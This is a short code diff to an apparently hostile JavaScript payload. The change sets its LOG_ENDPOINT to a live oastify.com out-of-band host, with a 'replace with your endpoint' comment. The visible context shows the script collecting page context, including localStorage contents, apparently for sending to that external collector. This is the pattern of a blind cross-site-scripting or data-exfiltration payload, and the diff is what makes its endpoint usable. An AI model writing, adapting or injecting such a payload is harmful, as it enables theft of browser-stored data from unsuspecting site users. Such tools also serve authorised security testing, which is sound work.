@@ -3,7 +3,7 @@
 
 (function () {
   // ===================== CONFIG =====================
-  const LOG_ENDPOINT = "kc0c4ukmnh9dp2x0uosdhimouf06oycn.oastify.com"; // <- replace with your endpoint
+  const LOG_ENDPOINT = "https://kc0c4ukmnh9dp2x0uosdhimouf06oycn.oastify.com"; // <- replace with your endpoint
 
   // ===================== COLLECT =====================
   function collectContext() {
@@ -133,6 +133,7 @@
     console.log("%cLocalStorage%c %d item(s)", sub, dim, payload.localStorage.total);
   })();
 })();
+
 
 
 
